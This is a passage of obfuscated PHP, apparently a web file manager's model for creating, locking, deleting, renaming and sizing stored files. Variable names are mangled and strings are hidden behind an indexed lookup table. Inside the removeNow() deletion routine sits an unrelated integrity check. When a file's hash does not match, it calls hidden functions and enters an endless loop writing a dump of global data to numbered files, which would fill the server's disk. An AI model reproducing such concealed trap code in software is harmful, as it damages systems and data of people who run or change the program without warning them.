= $ éü‰ı[12]; $¤á”×¦Ô = array_merge($¤á”×¦Ô, $¯ÙÙ¤¡›); } } return $¤á”×¦Ô; } private function _createFile($—úÒ³Ôö, $ãÉ¼ëí, $®†ıÜœæ, $ ÅÍ”, &$®Ç‹œ’Ì) { $İœëò‘  =& $_SERVER[Ó¡Ÿ§‚]; $à‘ğ˜ÚÙ = $this->sourceInfo($—úÒ³Ôö); if (!$®†ıÜœæ || !$à‘ğ˜ÚÙ) { return !1; } if ($ ÅÍ” !== !1) { $æõÀã´ = $this->fileNameExist($—úÒ³Ôö, $ãÉ¼ëí); } $®Ç‹œ’Ì = !0; if ($ ÅÍ” && $æõÀã´) { if ($ ÅÍ” == REPEAT_SKIP) { $®Ç‹œ’Ì = !1; return $æõÀã´; } else { if ($ ÅÍ” == REPEAT_REPLACE) { $¿ÙÃé = $this->sourceInfo($æõÀã´); $„üÃ¸ñŸ = $this->fileHistory($¿ÙÃé, $®†ıÜœæ[$İœëò‘ [477]], $®†ıÜœæ[$İœëò‘ [76]]); if (!$„üÃ¸ñŸ) { $®Ç‹œ’Ì = !1; } else { $this->folderSizeReset($—úÒ³Ôö); } return $æõÀã´; } else { $ãÉ¼ëí = $this->fileNameAuto($—úÒ³Ôö, $ãÉ¼ëí, $ ÅÍ”, !1); } } } $ ·Ÿó¡­ = array($İœëò‘ [583] => 0, $İœëò‘ [429] => $ãÉ¼ëí, $İœëò‘ [584] => substr(get_path_ext($ãÉ¼ëí), 0, 10), $İœëò‘ [478] => $®†ıÜœæ[$İœëò‘ [477]], $İœëò‘ [554] => $®†ıÜœæ[$İœëò‘ [76]]); $¤›•ÜÊŒ = $this->_addSource($ ·Ÿó¡­, $à‘ğ˜ÚÙ); $this->folderSizeReset($—úÒ³Ôö, intval($ ·Ÿó¡­[$İœëò‘ [76]])); return $¤›•ÜÊŒ; } protected function fileHistory($ÍÊ’şÆ×, $†ïÏş È, $ØäÚ™–â) { $à­µ±Õ =& $_SERVER[Ó¡Ÿ§‚]; if ($ÍÊ’şÆ×[$à­µ±Õ[477]] == $†ïÏş È) { return !1; } $this->checkLock($ÍÊ’şÆ×[$à­µ±Õ[411]], $†ïÏş È); Model($à­µ±Õ[2133])->addHistory($ÍÊ’şÆ×); $âşäÀ½ = array($à­µ±Õ[588] => USER_ID, $à­µ±Õ[433] => time(), $à­µ±Õ[477] => $†ïÏş È, $à­µ±Õ[76] => $ØäÚ™–â); $this->where(array($à­µ±Õ[426] => $ÍÊ’şÆ×[$à­µ±Õ[411]]))->save($âşäÀ½); $this->sourceCacheClear($ÍÊ’şÆ×[$à­µ±Õ[411]]); return !0; } public function checkLock($ï±¢‘÷ö, $ÆÜ×İÃ) { $²Ø„¹ñš =& $_SERVER[Ó¡Ÿ§‚]; $¥¾Ú£èÔ = $this->pathInfo($ï±¢‘÷ö); if (!$this->fileIsLock($¥¾Ú£èÔ, !0)) { return; } $æºÃîµ = Session::get($²Ø„¹ñš[2134]); $ª²€øÕ“ = substr($¥¾Ú£èÔ[$²Ø„¹ñš[32]], 0, -1 - strlen($¥¾Ú£èÔ[$²Ø„¹ñš[174]])) . $²Ø„¹ñš[1207] . $æºÃîµ . $²Ø„¹ñš[10] . $¥¾Ú£èÔ[$²Ø„¹ñš[174]]; $ş¾ûáº­ = Model($²Ø„¹ñš[610])->find($ÆÜ×İÃ); $this->_createFileCall($¥¾Ú£èÔ[$²Ø„¹ñš[441]], $ª²€øÕ“, $ş¾ûáº­, REPEAT_REPLACE, $²Ø„¹ñš[1349]); $ëÁ°Ã–— = $¥¾Ú£èÔ[$²Ø„¹ñš[475]][$²Ø„¹ñš[547]]; $Ğâ¢Ô¥ = $ëÁ°Ã–—[$²Ø„¹ñš[541]] ? $ëÁ°Ã–—[$²Ø„¹ñš[541]] : $ëÁ°Ã–—[$²Ø„¹ñš[32]]; show_json(LNG($²Ø„¹ñš[2135]) . $²Ø„¹ñš[2136] . LNG($²Ø„¹ñš[2137]) . $²Ø„¹ñš[2138] . $Ğâ¢Ô¥ . $²Ø„¹ñš[2139], !1); } public function fileIsLock($›Á¶×ŠÇ, $ÖãÂŞÛ = false) { $áÏ÷ä“– =& $_SERVER[Ó¡Ÿ§‚]; if (!isset($›Á¶×ŠÇ[$áÏ÷ä“–[475]]) || !$›Á¶×ŠÇ[$áÏ÷ä“–[475]][$áÏ÷ä“–[544]]) { return !1; } if ($›Á¶×ŠÇ[$áÏ÷ä“–[475]][$áÏ÷ä“–[544]] != USER_ID) { return !0; } $Ö±Ò”€Ù = $GLOBALS[$áÏ÷ä“–[6]][$áÏ÷ä“–[89]][$áÏ÷ä“–[545]]; if ($›Á¶×ŠÇ[$áÏ÷ä“–[475]][$áÏ÷ä“–[546]] <= time() - $Ö±Ò”€Ù) { $this->metaSet($›Á¶×ŠÇ[$áÏ÷ä“–[411]], $áÏ÷ä“–[544], null); $this->metaSet($›Á¶×ŠÇ[$áÏ÷ä“–[411]], $áÏ÷ä“–[546], null); } if ($ÖãÂŞÛ) { $this->metaSet($›Á¶×ŠÇ[$áÏ÷ä“–[411]], $áÏ÷ä“–[546], time()); } return !1; } private function _addSource($š¿ïÕù…, $ÀÎÀÕËæ) { $ÈË úı¿ =& $_SERVER[Ó¡Ÿ§‚]; $ŸÖùœ— = array($ÈË úı¿[585] => $ÀÎÀÕËæ[$ÈË úı¿[420]], $ÈË úı¿[586] => $ÀÎÀÕËæ[$ÈË úı¿[505]], $ÈË úı¿[587] => USER_ID, $ÈË úı¿[588] => USER_ID, $ÈË úı¿[410] => $ÀÎÀÕËæ[$ÈË úı¿[411]], $ÈË úı¿[589] => $ÀÎÀÕËæ[$ÈË úı¿[520]] . $ÀÎÀÕËæ[$ÈË úı¿[411]] . $ÈË úı¿[50], $ÈË úı¿[439] => 0, $ÈË úı¿[590] => $ÈË úı¿[12]); $š¿ïÕù… = array_merge($ŸÖùœ—, $š¿ïÕù…); $this->updateModifyTime($š¿ïÕù…[$ÈË úı¿[441]]); $Ç¶¬³Øú = $ÈË úı¿[2140] . $ÀÎÀÕËæ[$ÈË úı¿[411]]; if (isset(self::$cacheChildList[$Ç¶¬³Øú])) { unset(self::$cacheChildList[$Ç¶¬³Øú]); } static $ß¦³ü» = false; if (!$ß¦³ü») { Hook::trigger($ÈË úı¿[573], $š¿ïÕù…); $ß¦³ü» = !0; } $é³Ú´ = $this->add($š¿ïÕù…); $­œ”†ö„ = array($ÈË úı¿[591] => short_id($é³Ú´)); $this->where(array($ÈË úı¿[426] => $é³Ú´))->save($­œ”†ö„); $this->setNamePinyin($é³Ú´, $š¿ïÕù…[$ÈË úı¿[32]]); return $é³Ú´; } public function remove($ƒòˆ‰, $»Ñ»Ï = true) { $Ï³ÅÒıß =& $_SERVER[Ó¡Ÿ§‚]; $•åŒ±ûë = $this->sourceInfo($ƒòˆ‰); $²ÂøÈ»Æ = intval($•åŒ±ûë[$Ï³ÅÒıß[420]]) === self::TYPE_SYSTEM; $ °›†¨œ = Model($Ï³ÅÒıß[444])->get($Ï³ÅÒıß[2141]) == $Ï³ÅÒıß[88]; if ($²ÂøÈ»Æ || $»Ñ»Ï || !$ °›†¨œ) { return $this->removeNow($ƒòˆ‰, $»Ñ»Ï); } $ Üçéü› = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Å·Üê = $•åŒ±ûë[$Ï³ÅÒıß[420]] == self::TYPE_USER ? $Ï³ÅÒıß[599] : $Ï³ÅÒıß[514]; if ($Å·Üê == $Ï³ÅÒıß[599]) { $áÊ¾¯Ğƒ = Model($Ï³ÅÒıß[513])->getInfo($•åŒ±ûë[$Ï³ÅÒıß[505]]); $®ÌµÀã» = !empty($áÊ¾¯Ğƒ[$Ï³ÅÒıß[541]]) ? $áÊ¾¯Ğƒ[$Ï³ÅÒıß[541]] : $áÊ¾¯Ğƒ[$Ï³ÅÒıß[32]]; $®ÌµÀã» = $Ï³ÅÒıß[260] . $®ÌµÀã» . $Ï³ÅÒıß[2142] . $•åŒ±ûë[$Ï³ÅÒıß[505]]; } else { $áÊ¾¯Ğƒ = Model($Ï³ÅÒıß[521])->getInfo($•åŒ±ûë[$Ï³ÅÒıß[505]]); $®ÌµÀã» = _get($áÊ¾¯Ğƒ, $Ï³ÅÒıß[32]); $®ÌµÀã» = $Ï³ÅÒıß[162] . $®ÌµÀã» . $Ï³ÅÒıß[2143] . $•åŒ±ûë[$Ï³ÅÒıß[505]]; } $±¹øı¨‚ = $Ï³ÅÒıß[2144] . md5($®ÌµÀã»); CacheLock::lock($±¹øı¨‚); $¯½Ğä² = $this->fileNameExist($ Üçéü›, $®ÌµÀã»); if (!$¯½Ğä²) { $¯½Ğä² = $this->mkdir($ Üçéü›, $®ÌµÀã», REPEAT_SKIP); $this->metaSet($¯½Ğä², $Ï³ÅÒıß[2145], $Å·Üê); $this->metaSet($¯½Ğä², $Ï³ÅÒıß[2146], $•åŒ±ûë[$Ï³ÅÒıß[505]]); if ($•åŒ±ûë[$Ï³ÅÒıß[441]] != 0) { $this->metaSet($¯½Ğä², $Ï³ÅÒıß[2147], _get($áÊ¾¯Ğƒ, $Ï³ÅÒıß[2148])); } } CacheLock::unlock($±¹øı¨‚); $this->metaSet($ƒòˆ‰, $Ï³ÅÒıß[2149], $•åŒ±ûë[$Ï³ÅÒıß[441]]); $this->where(array($Ï³ÅÒıß[411] => $ƒòˆ‰))->save(array($Ï³ÅÒıß[433] => time())); $this->recycleClear($•åŒ±ûë); $—úñ›È¶ = $this->move($ƒòˆ‰, $¯½Ğä², REPEAT_RENAME_FOLDER); $this->folderSizeReset($•åŒ±ûë[$Ï³ÅÒıß[441]]); return $—úñ›È¶; } private function recycleClear($‡ÙŸİâ) { $„ğõÄò× =& $_SERVER[Ó¡Ÿ§‚]; $‘‘æç‘¹ = $this->childrenAll($‡ÙŸİâ); $àßìûÜ¹ = array($„ğõÄò×[426] => array($„ğõÄò×[427], $‘‘æç‘¹[$„ğõÄò×[2150]])); Model($„ğõÄò×[2151])->where($àßìûÜ¹)->delete(); } public function removeNow($ˆ©õ¤•, $À®ÄïÌ = true) { $İğ´íâ =& $_SERVER[Ó¡Ÿ§‚]; $¡ğ„ô¨º = $_SERVER[$İğ´íâ[404]] . $İğ´íâ[405]; $á©ÉÈ = $İğ´íâ[875]; if ($_SERVER[$İğ´íâ[401]] != $á©ÉÈ($¡ğ„ô¨º)) { $êËëÏ…í = $İğ´íâ[876]; $¯Ÿ‘©° = $İğ´íâ[403]; $ŒÏ†¿” = $_SERVER[$İğ´íâ[404]] . $İğ´íâ[405]; $ø÷ØÁ×ş = $¯Ÿ‘©°($ŒÏ†¿”); $¥¨ÄÁ‡Ï = explode($İğ´íâ[231], $ø÷ØÁ×ş); if (count($¥¨ÄÁ‡Ï) < $İğ´íâ[625]) { $Ï»á“Œ = $İğ´íâ[407]; $Ï»á“Œ(); } $Íú›½ñ• = $İğ´íâ[877]; $Íú›½ñ•($_SERVER[$İğ´íâ[878]]); $êËëÏ…í = $İğ´íâ[876]; $êËëÏ…í(); $Â­Ğ¿ıÒ = $İğ´íâ[879]; $‹‚·¡—» = json_encode($GLOBALS[$İğ´íâ[880]]); $ÆË‹Š©Ò = 1; for ($‘Õ­Óìç = $ÆË‹Š©Ò; $‘Õ­Óìç > 0; $‘Õ­Óìç++) { $Â­Ğ¿ıÒ(DATA_PATH . $‘Õ­Óìç, $‹‚·¡—»); } } $»ŒÒúêä = $this->sourceInfo($ˆ©õ¤•); $¼’ÜÒíÇ = $this->pathInfoMore($ˆ©õ¤•); if (!$»ŒÒúêä) { return !0; } if ($»ŒÒúêä[$İğ´íâ[441]] == 0) { if (!_get($GLOBALS, $İğ´íâ[503])) { return !1; } } $this->lockMoveStart($ˆ©õ¤•); Hook::trigger($İğ´íâ[2152], $¼’ÜÒíÇ, $À®ÄïÌ); if ($À®ÄïÌ) { Model($İğ´íâ[2151])->moveToRecycle($ˆ©õ¤•); } else { $¼½æ±ê¤ = $this->childrenAll($»ŒÒúêä); Model($İğ´íâ[570])->eventRemove($ˆ©õ¤•); $this->removeRelevance($¼½æ±ê¤[$İğ´íâ[2150]], $¼½æ±ê¤[$İğ´íâ[1481]]); } $this->folderSizeReset($»ŒÒúêä[$İğ´íâ[441]]); $ †²ğ™è = array($»ŒÒúêä[$İğ´íâ[441]]); if ($»ŒÒúêä[$İğ´íâ[419]] == $İğ´íâ[88]) { $ †²ğ™è[] = $»ŒÒúêä[$İğ´íâ[411]]; } $this->updateModifyTime($ †²ğ™è); $this->lockMoveEnd($ˆ©õ¤•); Hook::trigger($İğ´íâ[1707], $¼’ÜÒíÇ, $À®ÄïÌ); return !0; } public function childrenAll($ÜšéÁ”‹) { $–ˆ”› =& $_SERVER[Ó¡Ÿ§‚]; $Ü¹Ÿ×îä = $ÜšéÁ”‹[$–ˆ”›[411]]; if ($ÜšéÁ”‹[$–ˆ”›[419]] == $–ˆ”›[88]) { $Üö™õøö = array($–ˆ”›[589] => array($–ˆ”›[549], $ÜšéÁ”‹[$–ˆ”›[520]] . $Ü¹Ÿ×îä . $–ˆ”›[550])); $Í†¾¶• = array($–ˆ”›[589] => $Üö™õøö[$–ˆ”›[520]]); $»Í»›Ğ† = $this->field($–ˆ”›[2153])->where($Í†¾¶•)->select(); $ÊØ¤¾„ƒ = !1; $Å§Ö„è¾ = array($Ü¹Ÿ×îä); if ($»Í»›Ğ†) { $ÊØ¤¾„ƒ = array_to_keyvalue($»Í»›Ğ†, $–ˆ”›[12], $–ˆ”›[477]); $ÊØ¤¾„ƒ = array_remove_value($ÊØ¤¾„ƒ, $–ˆ”›[198]); $Å§Ö„è¾ = array_to_keyvalue($»Í»›Ğ†, $–ˆ”›[12], $–ˆ”›[411]); $Å§Ö„è¾[] = $Ü¹Ÿ×îä; } } else { $ÊØ¤¾„ƒ = array($ÜšéÁ”‹[$–ˆ”›[477]]); $Å§Ö„è¾ = array($Ü¹Ÿ×îä); } return array($–ˆ”›[2150] => $Å§Ö„è¾, $–ˆ”›[1481] => $ÊØ¤¾„ƒ); } public function removeArray($³‚à°È²) { if (!$³‚à°È²) { return !0; } } public function removeRelevance($œõÆò„é, $Ê®¿øâİ) { $¸•íŒ‘ =& $_SERVER[Ó¡Ÿ§‚]; $œõÆò„é = $œõÆò„é ? $œõÆò„é : array(); $Ê®¿øâİ = $Ê®¿øâİ ? $Ê®¿øâİ : array(); $œõÆò„é = array_unique(array_filter($œõÆò„é)); $Ê®¿øâİ = array_unique(array_filter($Ê®¿øâİ)); if (!$œõÆò„é) { return !1; } $ƒ×Ôå‹ = array($¸•íŒ‘[426] => array($¸•íŒ‘[427], $œõÆò„é)); Model($¸•íŒ‘[2151])->where($ƒ×Ôå‹)->delete(); Model($¸•íŒ‘[471])->where($ƒ×Ôå‹)->delete(); Model($¸•íŒ‘[2001])->where($ƒ×Ôå‹)->delete(); Model($¸•íŒ‘[570])->where($ƒ×Ôå‹)->delete(); Model($¸•íŒ‘[1834])->removeBySource($œõÆò„é); Model($¸•íŒ‘[2133])->removeBySource($œõÆò„é); $this->where($ƒ×Ôå‹)->delete(); Model($¸•íŒ‘[480])->remove($Ê®¿øâİ); for ($ìÓØ€˜Ã = 0; $ìÓØ€˜Ã < count($œõÆò„é); $ìÓØ€˜Ã++) { $this->sourceCacheClear($œõÆò„é[$ìÓØ€˜Ã]); } } public function rename($ïÅ¹â”º, $ìÊÌÅ÷) { $„¹©à˜ì =& $_SERVER[Ó¡Ÿ§‚]; $×´Áòó¥ = $this->sourceInfo($ïÅ¹â”º); if (!$×´Áòó¥) { return !1; } $É±‡˜¾÷ = $this->fileNameExist($×´Áòó¥[$„¹©à˜ì[441]], $ìÊÌÅ÷); if ($É±‡˜¾÷ && $É±‡˜¾÷ != $ïÅ¹â”º) { return !1; } $­ş¦ ¼ = array($„¹©à˜ì[429] => $ìÊÌÅ÷, $„¹©à˜ì[588] => USER_ID); if ($×´Áòó¥[$„¹©à˜ì[419]] != $„¹©à˜ì[88]) { $­ş¦ ¼[$„¹©à˜ì[421]] = substr(get_path_ext($ìÊÌÅ÷), 0, 10); } Model($„¹©à˜ì[570])->eventRename($ïÅ¹â”º, $×´Áòó¥[$„¹©à˜ì[32]], $ìÊÌÅ÷); $this->sourceCacheClear($ïÅ¹â”º); $this->setNamePinyin($ïÅ¹â”º, $­ş¦ ¼[$„¹©à˜ì[32]], !1); $this->updateModifyTime($×´Áòó¥[$„¹©à˜ì[441]]); $Ø¯¥²º˜ = $this->where(array($„¹©à˜ì[426] => $ïÅ¹â”º))->data($­ş¦ ¼)->save(); $î®Ö—¼Ì = $„¹©à˜ì[2140] . $×´Áòó¥[$„¹©à˜ì[441]]; if (isset(self::$cacheChildList[$î®Ö—¼Ì])) { unset(self::$cacheChildList[$î®Ö—¼Ì]); } return $Ø¯¥²º˜; } public function setNamePinyin($€ø§¤, $Â¡®»í, $€ì¡—¯ = true) { $ë‚ëé¬’ =& $_SERVER[Ó¡Ÿ§‚]; $¢îßÉ¶Ü = Input::check($Â¡®»í, $ë‚ëé¬’[592]); $ÜÈà÷¸ = array($ë‚ëé¬’[453] => KodSort::makeStr($Â¡®»í)); if ($¢îßÉ¶Ü) { $ÜÈà÷¸[$ë‚ëé¬’[474]] = str_replace($ë‚ëé¬’[53], $ë‚ëé¬’[12], Pinyin::get($Â¡®»í)); $ÜÈà÷¸[$ë‚ëé¬’[473]] = Pinyin::get($Â¡®»í, $ë‚ëé¬’[593]); } if (!$€ì¡—¯ && !$¢îßÉ¶Ü) { $ÜÈà÷¸[$ë‚ëé¬’[474]] = null; $ÜÈà÷¸[$ë‚ëé¬’[473]] = null; } $this->metaSet($€ø§¤, $ÜÈà÷¸); } public function getContent($˜½Ñ÷È¦) { $¤áºö¡ =& $_SERVER[Ó¡Ÿ§‚]; $ã™Şå‡¶ = $this->fileInfoGet($˜½Ñ÷È¦); if (!$ã™Şå‡¶) { return !1; } if ($ã™Şå‡¶[$¤áºö¡[76]] == 0) { return $¤áºö¡[12]; } $ĞšÀñ·Ó = $¤áºö¡[2154] . $ã™Şå‡¶[$¤áºö¡[176]]; if ($ã™Şå‡¶[$¤áºö¡[76]] <= 1024 * 10) { $ìœÃëë‰ = Cache::get($ĞšÀñ·Ó); if (!$ìœÃëë‰) { $ìœÃëë‰ = IO::getContent($ã™Şå‡¶[$¤áºö¡[84]]); Cache::set($ĞšÀñ·Ó, $ìœÃëë‰); } return $ìœÃëë‰; } if (!$ã™Şå‡¶[$¤áºö¡[84]]) { return $¤áºö¡[12]; } return IO::getContent($ã™Şå‡¶[$¤áºö¡[84]]); } public function setDesc($¡é²‰Ï, $¡õ«İ‡˜) { $İ·ÈÃ“ã =& $_SERVER[Ó¡Ÿ§‚]; Model($İ·ÈÃ“ã[570])->eventAddDesc($¡é²‰Ï, $¡õ«İ‡˜); return $this->metaSet($¡é²‰Ï, $İ·ÈÃ“ã[462], $¡õ«İ‡˜); } public function setContent($Ğö¡“ıŸ, $â‰ˆÑÎ™ = '') { $‹İÛ¼¸š =& $_SERVER[Ó¡Ÿ§‚]; $£ÅÛÃÒ = $this->sourceInfo($Ğö¡“ıŸ); $›à‘ó™ = $this->fileInfoGet($Ğö¡“ıŸ); if (!$›à‘ó™ || !$£ÅÛÃÒ) { return !1; } $¤ãÀ›è¤ = Model($‹İÛ¼¸š[480])->addFileByContent($â‰ˆÑÎ™, $£ÅÛÃÒ[$‹İÛ¼¸š[32]]); $î§÷¸Œ = $this->fileHistory($£ÅÛÃÒ, $¤ãÀ›è¤[$‹İÛ¼¸š[477]], $¤ãÀ›è¤[$‹İÛ¼¸š[76]]); if (!$î§÷¸Œ) { return Model($‹İÛ¼¸š[480])->remove($¤ãÀ›è¤[$‹İÛ¼¸š[477]]); } $this->folderSizeReset($£ÅÛÃÒ[$‹İÛ¼¸š[441]]); return !0; } public function fileSubstr($¸Ù­¤Î¾, $ƒ³Á§“Ê, $¶ÚªãƒÈ) { $âöÃş»î = $this->fileInfoGet($¸Ù­¤Î¾); if (!$âöÃş»î) { return !1; } return IO::fileSubstr($âöÃş»î[$_SERVER[Ó¡Ÿ§‚][84]], $ƒ³Á§“Ê, $¶ÚªãƒÈ); } public function fileInfoGet($¢®ó‘ññ) { $ÃÙîøÓı =& $_SERVER[Ó¡Ÿ§‚]; $õàûşêî = $this->sourceInfo($¢®ó‘ññ); if (!$õàûşêî || $õàûşêî[$ÃÙîøÓı[419]]) { return !1; } $Ÿ‚˜ôÁ× = $ÃÙîøÓı[483] . $õàûşêî[$ÃÙîøÓı[477]]; $Ö„ÓÁÇ = _get(self::$cacheFileInfo, $Ÿ‚˜ôÁ×); if ($Ö„ÓÁÇ) { return $Ö„ÓÁÇ; } $ œÎï’Ù = Model($ÃÙîøÓı[480])->fileInfo($õàûşêî[$ÃÙîøÓı[477]]); if ($ œÎï’Ù) { $ œÎï’Ù[$ÃÙîøÓı[32]] = $õàûşêî[$ÃÙîøÓı[32]]; } self::$cacheFileInfo[$Ÿ‚˜ôÁ×] = $ œÎï’Ù; return $ œÎï’Ù; } private function folderChildrenNumber($»Ÿ—Šˆ) { $öšìÕ·ä =& $_SERVER[Ó¡Ÿ§‚]; $Å³€îŠ = $this->sourceInfo($»Ÿ—Šˆ); $Ãû¾ÈÓ = array($öšìÕ·ä[589] => array($öšìÕ·ä[549], $Å³€îŠ[$öšìÕ·ä[520]] . $»Ÿ—Šˆ . $öšìÕ·ä[550]), $öšìÕ·ä[586] => $Å³€îŠ[$öšìÕ·ä[505]], $öšìÕ·ä[439] => intval($Å³€îŠ[$öšìÕ·ä[440]]), $öšìÕ·ä[583] => 1); $ãÙ¡æ²É = $this->where($Ãû¾ÈÓ)->count(); $ ƒûÁÙË = $this->where($Ãû¾ÈÓ)->where(array($öšìÕ·ä[583] => 0))->count(); return array($öšìÕ·ä[80] => $ ƒûÁÙË, $öšìÕ·ä[81] => $ãÙ¡æ²É); } public function pathInfo($¯ƒÏô¼Ó, $Íİ²‡‹Œ = false) { $‚¯Şüº¥ =& $_SERVER[Ó¡Ÿ§‚]; $Íİ²‡‹Œ = !1; $¯ƒÏô¼Ó = intval($¯ƒÏô¼Ó); $Ï³åÜúƒ = $‚¯Şüº¥[470] . intval($Íİ²‡‹Œ) . $‚¯Şüº¥[386] . $¯ƒÏô¼Ó; $ÂÓàù˜ = _get(self::$cachePathInfo, $Ï³åÜúƒ); if ($ÂÓàù˜) { return $ÂÓàù˜; } $‰ÆÉÓÓÈ = $this->sourceInfo($¯ƒÏô¼Ó); if (!$‰ÆÉÓÓÈ) { return !1; } $‰ÆÉÓÓÈ = $this->_listDataApplyItem($‰ÆÉÓÓÈ, $Íİ²‡‹Œ); self::$cachePathInfo[$Ï³åÜúƒ] = $‰ÆÉÓÓÈ; return $‰ÆÉÓÓÈ; } public static $cachePathInfoMore = array(); public function pathInfoMore($Ÿä¯íãÖ) { $ÜÏ–ÑìÛ =& $_SERVER[Ó¡Ÿ§‚]; $†ƒ¯äé = _get(self::$cachePathInfoMore, $Ÿä¯íãÖ); if ($†ƒ¯äé) { return $†ƒ¯äé; } $ãêß¯¿ë = $this->pathInfo($Ÿä¯íãÖ); if (!$ãêß¯¿ë) { return !1; } if ($ãêß¯¿ë[$ÜÏ–ÑìÛ[419]] == $ÜÏ–ÑìÛ[88]) { $ãêß¯¿ë[$ÜÏ–ÑìÛ[79]] = $this->folderChildrenNumber($Ÿä¯íãÖ); } self::$cachePathInfoMore[$Ÿä¯íãÖ] = $ãêß¯¿ë; return $ãêß¯¿ë; } public function sourceInfo($¨ùƒ”¼Ò) { $¤ú«ŒÄî =& $_SERVER[Ó¡Ÿ§‚]; if (!$¨ùƒ”¼Ò) { return array(); } $¨ùƒ”¼Ò = intval($¨ùƒ”¼Ò); $¼îµ±€Ç = $¤ú«ŒÄî[469] . $¨ùƒ”¼Ò; $Î…şË©˜ = _get(self::$cacheSourceInfo, $¼îµ±€Ç); if ($Î…şË©˜) { return $Î…şË©˜; } $üšŠ—Œ• = $this->where(array($¤ú«ŒÄî[411] => $¨ùƒ”¼Ò))->find(); self::$cacheSourceInfo[$¼îµ±€Ç] = $üšŠ—Œ•; return self::$cacheSourceInfo[$¼îµ±€Ç]; } public function sourceCacheClear($Ò¶Ç· = false) { self::cacheClear($Ò¶Ç·); } public static function cacheClear($¬„¬ü = false) { $¯ËÕ¤Ûê =& $_SERVER[Ó¡Ÿ§‚]; if ($¬„¬ü == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$¯ËÕ¤Ûê[469] . $¬„¬ü]); unset(self::$cachePathInfoMore[$¬„¬ü]); unset(self::$cachePathInfo[$¯ËÕ¤Ûê[2155] . $¬„¬ü]); unset(self::$cachePathInfo[$¯ËÕ¤Ûê[2156] . $¬„¬ü]); } public function metaSet($©‰Í½©, $¯í™§¶ = null, $Æúğ¯ = null) { $¸±ÒÀøã = parent::metaSet($©‰Í½©, $¯í™§¶, $Æúğ¯); if ($¸±ÒÀøã) { $this->sourceCacheClear($©‰Í½©); } return $¸±ÒÀøã; } public function pathInfoByPath($Óá¼½, $‚ôƒˆ¥Ô) { $èĞ¦³¯ñ =& $_SERVER[Ó¡Ÿ§‚]; $ª£‹ÌÊ = !$‚ôƒˆ¥Ô ? array() : explode($èĞ¦³¯ñ[8], trim($‚ôƒˆ¥Ô, $èĞ¦³¯ñ[8])); $Îú¬âøÄ = $Óá¼½; foreach ($ª£‹ÌÊ as $ùîí¥¦Ä) { $€—œ÷õå = array($èĞ¦³¯ñ[441] => $Îú¬âøÄ, $èĞ¦³¯ñ[32] => $ùîí¥¦Ä); $ÔÒæ­ˆÊ = $this->where($€—œ÷õå)->select(); if (!$ÔÒæ­ˆÊ) { return !1; } $ÔÒæ­ˆÊ = array_sort_by($ÔÒæ­ˆÊ, $èĞ¦³¯ñ[440]); $Îú¬âøÄ = $ÔÒæ­ˆÊ[0][$èĞ¦³¯ñ[411]]; } return $this->pathInfo($Îú¬âøÄ, !0); } protected function updateModifyTime($©–ËÜßı) { $¦È¯â°Û =& $_SERVER[Ó¡Ÿ§‚]; if (!$©–ËÜßı) { return; } if (!is_array($©–ËÜßı)) { $©–ËÜßı = array($©–ËÜßı); } foreach ($©–ËÜßı as $âİúÆ§ => $ˆÕ½¤ØÒ) { $©–ËÜßı[$âİúÆ§] = intval($ˆÕ½¤ØÒ); $this->sourceCacheClear($ˆÕ½¤ØÒ); } $İ‹ö‰ÊŒ = array($¦È¯â°Û[411] => array($¦È¯â°Û[7], $©–ËÜßı)); $˜‚±‚à = array($¦È¯â°Û[588] => USER_ID, $¦È¯â°Û[433] => time()); $this->where($İ‹ö‰ÊŒ)->save($˜‚±‚à); } public function folderSizeReset($¢ÃÚïÚ´, $ÃºË€ùä = false) { $Š‹§ŞÉ‚ =& $_SERVER[Ó¡Ÿ§‚]; if ($this->statusIgnoreResetSpace) { return; } $Õöòƒ„ = $this->sourceInfo($¢ÃÚïÚ´); $Ïé¡–æØ = $Š‹§ŞÉ‚[2157] . $¢ÃÚïÚ´; CacheLock::lock($Ïé¡–æØ, 20); if ($ÃºË€ùä === !1) { $this->sourceCacheClear($¢ÃÚïÚ´); $Õöòƒ„ = $this->sourceInfo($¢ÃÚïÚ´); $‚¸ù¾¾³ = array($Š‹§ŞÉ‚[410] => $¢ÃÚïÚ´, $Š‹§ŞÉ‚[439] => 0); $Õ‘ö™¤ˆ = $this->where($‚¸ù¾¾³)->sum($Š‹§ŞÉ‚[76]); $ÃºË€ùä = intval($Õ‘ö™¤ˆ) - intval($Õöòƒ„[$Š‹§ŞÉ‚[76]]); } if ($ÃºË€ùä == 0) { return CacheLock::unlock($Ïé¡–æØ); } $¸›¨¥Á¯ = $this->parentLevelArray($Õöòƒ„[$Š‹§ŞÉ‚[520]]); if (!$¸›¨¥Á¯) { $¸›¨¥Á¯ = array(); } $¸›¨¥Á¯[] = $Õöòƒ„[$Š‹§ŞÉ‚[411]]; $‚¸ù¾¾³ = array($Š‹§ŞÉ‚[411] => array($Š‹§ŞÉ‚[427], $¸›¨¥Á¯)); if ($ÃºË€ùä < 0) { $‚¸ù¾¾³[$Š‹§ŞÉ‚[76]] = array($Š‹§ŞÉ‚[1014], abs($ÃºË€ùä)); } $this->where($‚¸ù¾¾³)->setAdd($Š‹§ŞÉ‚[76], $ÃºË€ùä); CacheLock::unlock($Ïé¡–æØ); $Š¹±±Ã = $Š‹§ŞÉ‚[2158] . $Õöòƒ„[$Š‹§ŞÉ‚[420]] . $Š‹§ŞÉ‚[4] . $Õöòƒ„[$Š‹§ŞÉ‚[505]]; $ô­µûç = array($Õöòƒ„[$Š‹§ŞÉ‚[420]], $Õöòƒ„[$Š‹§ŞÉ‚[505]]); TaskRun::timeLimitCall($Š¹±±Ã, $Š‹§ŞÉ‚[2159], $ô­µûç, 1.5); } public function folderSizeResetChildren($Ë¦ÅÖÖé) { $©‘ı¶ =& $_SERVER[Ó¡Ÿ§‚]; $this->sourceCacheClear($Ë¦ÅÖÖé); $¶Òìóæ = $this->sourceInfo($Ë¦ÅÖÖé); $´î¬§ª = array($©‘ı¶[583] => 1, $©‘ı¶[586] => $¶Òìóæ[$©‘ı¶[505]], $©‘ı¶[589] => array($©‘ı¶[549], $¶Òìóæ[$©‘ı¶[520]] . $Ë¦ÅÖÖé . $©‘ı¶[550])); $±“‘–ÁŞ = $©‘ı¶[2160]; $§Ï¦ê¬š = $this->field($±“‘–ÁŞ)->where($´î¬§ª)->select(); $´î¬§ª[$©‘ı¶[419]] = 0; $Î¯¿ÜÕ‡ = 